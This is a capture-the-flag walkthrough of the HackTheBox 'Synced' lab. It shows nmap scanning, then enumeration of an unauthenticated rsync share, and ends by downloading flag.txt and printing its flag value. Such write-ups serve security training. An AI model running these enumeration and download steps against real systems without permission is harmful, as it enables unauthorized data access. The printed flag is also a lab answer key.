---
title: "HackTheBox Starting Point: Synced Walkthrough"
date: 2025-02-06
description: ''
image: '/public/static/htb-cover.jpg'
authors: ['chjwoo']
tags: ["Rsync","Reconnaissance","Anonymouse Access"]
---


In this post, we'll walk through the process of enumerating and exploiting an unsecured Rsync service to retrieve sensitive information. This attack is commonly seen in misconfigured systems where Rsync is left open without authentication, allowing unauthorized users to access shared files. Let's dive into the details of how we discovered, accessed, and extracted data from the target system.

## Reconnaissance

The first step in any penetration test is reconnaissance. We start by scanning the target machine `10.129.234.23` using `nmap` to identify open ports and running services.

```bash
└─$ sudo nmap -sV -p- --min-rate=1000 10.129.234.23 --stats-every=10s
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 10:44 WIB
Service scan Timing: About 0.00% done
Nmap scan report for 10.129.234.23
Host is up (0.26s latency).
Not shown: 65534 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.31 seconds
```

From the scan, we see that port **`873`** is open, which is typically used by Rsync. Rsync is a widely used utility for file synchronization, and if misconfigured, it can allow unauthorized users to list and download files without authentication. This presents a potential security risk and an opportunity for us to explore further.

## Foothold

Since Rsync is running on the target machine, our next step is to check if we can access any shared directories.

We begin by listing the available shares using the `rsync --list-only` command:

```
└─$ rsync --list-only 10.129.234.23::
public          Anonymous Share
```

We find that there is a publicly accessible share named **public**. Now, let's check the contents of this directory:

```
└─$ rsync --list-only 10.129.234.23::public

    drwxr-xr-x          4,096 2022/10/25 05:02:23 .
    -rw-r--r--             33 2022/10/25 04:32:03 flag.txt
```

### Exploiting the Misconfiguration

From the output, we see that there is a file named **flag.txt**. Since the Rsync service is misconfigured to allow unauthenticated access, we can attempt to download this file.

We use Rsync to fetch the `flag.txt` file:

```
└─$ rsync 10.129.234.23::public/flag.txt ./flag.txt
```

After successfully downloading the file, we confirm its presence by listing the current directory:

```
└─$ ls
flag.txt
```

## Flag

Now, let’s read the contents of the file to retrieve the flag:

```bash
72eaf5344ebb84908ae543a719830519
```